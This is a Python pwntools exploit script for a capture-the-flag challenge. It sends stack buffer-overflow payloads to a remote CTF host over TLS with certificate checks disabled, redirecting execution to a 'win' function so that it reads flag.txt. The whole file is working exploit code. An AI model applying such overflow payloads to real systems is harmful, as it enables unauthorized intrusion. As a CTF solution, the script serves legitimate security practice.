#!/usr/bin/python3
from pwn import *
import ssl

elf = context.binary = ELF("pwn-pas-ouf")

# openssl s_client -quiet -verify_quiet -connect main-5000-pwn-pas-ouf-c50f319ee6be36e6.ctf.4ts.fr:52525
gs = '''
b *main+152
'''
# Create an SSL context
context = ssl.create_default_context()

# Optionally, customize the SSL context if needed (e.g., disable certificate verification)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("main-5000-pwn-pas-ouf-c50f319ee6be36e6.ctf.4ts.fr", 52525, ssl=True,ssl_context=context, sni=True)
    else:
        return process(elf.path)


win = 0x4011a0

io = start()

payload = b"A"*128 + b"flag.txt" + p64(0)*18 + p64(win) + b"\n"

payload1 = p64(0)*16 + b"flag.txt" + p64(0)*18 + p64(win) + b"\n"

payload2 = p64(0)*16 + b"readme.md" + p64(0)*17 + b"\x00"*7 + p64(win) + b"\n"

print(io.recvline())

print(payload2)
io.sendline(payload1)

print(io.recvall())

io.interactive()
